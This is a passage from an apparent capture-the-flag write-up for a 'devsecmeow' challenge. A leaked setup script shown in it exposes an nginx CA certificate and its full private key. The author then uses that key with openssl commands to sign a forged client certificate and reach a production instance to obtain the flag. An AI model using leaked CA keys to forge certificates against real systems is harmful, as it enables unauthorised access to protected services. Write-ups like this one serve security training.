/zANBgkqhkiG9w0BAQsFAAOCAQEAum41R46j6OlqmqdvEgt3D5pCsTa7fwfbvdqp
FgSlsGrwtRzAxETYPj6d+kYliFI/Z46tE3x15F5zisPPT3F/HjqzLPJBvCQWjiHW
+nRniqn5OzwgCsKB8kIVO01tE02ibWyIzL15s8IvzNTDH/WUUf1YvN/QKrvr7NC1
fGui/34w/Sikc1ckuayOM6B6yhf2WoCtC/txaGBxSa95tqSADxiw2X4ru7vuDqJO
TNVZrU3IkDCUhRSxvcesm4of0B21GCmpcUAU75A+UF3sl8jFTNf8oMFZzW17W4bg
tMdad2Pvl9IL3bWjT0uWMOU7uFWHRFCKEVrzCzJ6sUdyamwsLg==
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/ca.key
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDE2SyRtvuepEOd
UwUmtZBRi4JRHJiOdwZVlMQXM7Vw44QBHfkOZxG5WBZMAJQl1FGpvqUv/tVt+CbV
NXy+PvH+o1yIS93j83Oi2UFdgJckuKUsVTJ3G4SrOnFf18IbFAnSewoOzBi5SmLu
Kt73nbLxgCW78MACl/Cb8rytLZ52+8nbbCvVDOeYQh51/cYUjeCIWDKIHzVuaqxb
68vB3n32x5JVzjyybhV0hvDUrFCtBVT1HCvtXJHt+sUiK08ilNF8Po/+9kBlKZ2J
w8Cr7aIMaPVgTLgB9Gyf5qHtdCqnlkLiJlxxmJ0cZWUdKawNeonaSnB65ihULPIe
Mwi4+qQPAgMBAAECggEBAKABg7fiC/90uD0uWXaQiQGvq7rwypSq7SwtY4MUlfxw
A0HBMkvhvcdxcZZPthxVzBd1DuLHeocL+cy+0Gn30k7QTQvA11lN74XEoNw3BSRl
LmWtzvqAFMP2Gmf0giPuktlTB+blQYeDjozXriuKNQUWzBVLaVfyVzL8CR+fgDpn
nUai7P0thT8MjxXesVvf1jkq4yZqPMOLNLYEuUn5G+OkNCHoqrc4Ud/Ft1lqd4f1
yvJ+9IDBZ298+HhCnlwyZ+ipTZFTcgzV6o/f4Hq0hfiqGx0es0Gt+jtkpR99AS4A
xGGU9CMy2bKk7k5aaoin7dljiIcTrCkWsnCgaVHPNLkCgYEA4bW0AmHWFmzABT/T
TzzgQKJsFvwvKDWOJiDVTczZlTfXeWcM9WQtAecAk2ZxAZqtqXEatzhWsGIvmxMr
zMKz9RLxxRsttV4xzRwDfcjKzRuZAV0xXPsIuaZPpzrqCX8uFrvhijf8prWuLFZr
2mC7kxVVpfDjO68e74YJVSKmOgUCgYEA30Pua0vOPXFL2h8TcbjG9FyTxid4OQWE
s1IiLYRw3jVVWlJ2gAlZ4ey+zTG162zV4V2yHrZF23es45yoWgSRZkxufkQY9CJi
XMXf0qdyC1lVh/naJXdz5AYr5KwyDv9UKjJc6vubcuSmD6h6H3QOgkZeoCt75lwy
jKwwSRRL/gMCgYB4AoLp2VdZqQ0YPW1/biDWfQX32rLAMGmagE6qBUeTfZOGK3LK
by83GbpGpWtkrPe1ZjwMO1psgmhJjhH113iT0DTY1rChBKp6InEAymh6Ujgyb3i1
tYxYGcO0aTDTR9oboF41fbtKcMNhM7o47MIPXIKjrsdDjsNmG+COcdPseQKBgQC5
niqb/dwrbQQZBfkOdQbDpiwddDcZgSMASuqrWQ7VTxX1D9YBQMT/depzgj6yyjtP
MKyjp/qQKgENAvNcU6vmlujOBSOR5PxOERyycA/6q3zWnbzlpVguXYskhJzhpxl8
M37YxfJJJRuCrRlLCRv+5y5Ij55kuIY2Ofmy6DL9rQKBgQDefTgiSKVIlMpZRiGt
VOAD0MFda/k9tpTPT9HdlL4b44mkNzPailJATH0XLDqSwuXn4wJEgMAwqbM8CGSo
Opar3fixSriKkwuTuDy8fM1dbpjYCi8rKswGULTvpFHJQZSDu4+sCDxbZUv9VTAS
aUwjOeYyIZiB+SQt/kUUZm1acA==
-----END PRIVATE KEY-----

EOL
aws s3 cp s3://devsecmeow2023flag2/index.html /tmp/
sudo cp /tmp/index.html /var/www/html
rm /tmp/index.html
sudo systemctl restart nginx
```

There is the CA certificate and key! Now I can use these to sign another client certificate to access the production instance.

```sh
openssl req -new -newkey rsa:4096 -nodes -keyout client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365
openssl pkcs12 -export -out client.p12 -inkey client.key -in client.crt
```

I imported the p12 file to Chrome and accessed the production instance, where I got the second half of the flag: `yOuR_d3vSeCOps_P1peL1nEs!!<##:3##>}`

![flag2](/devsecmeow-flag2.png)